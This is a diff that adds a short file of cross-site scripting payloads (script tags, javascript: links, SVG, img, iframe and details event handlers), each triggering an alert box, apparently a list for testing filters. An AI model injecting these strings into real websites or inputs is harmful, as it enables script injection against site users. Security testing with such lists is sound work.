@@ -1,0 +1,14 @@
+>"<script>alert(8);</script> 
+<a href="javascript:alert(8)">Link</a>
+onerror='onerror="alert(8)"' 
+javascript:alert(8) 
+data:text/html,alert(8)
+<script>alert(8)</script>
+<svg/whatthe=""onload=alert(8)>
+"'><svg/whatthe=""onload=alert(8)>
+<script>alert('XSS')</script>
+<img src=0 onerror=alert('XSS')>
+<svg/onload=alert('XSS')>
+<body data-rsssl=1 onload=alert('XSS')>
+<iframe src="javascript:alert('XSS')"></iframe>
+<details/open/ontoggle=a=alert,a("XSS")>
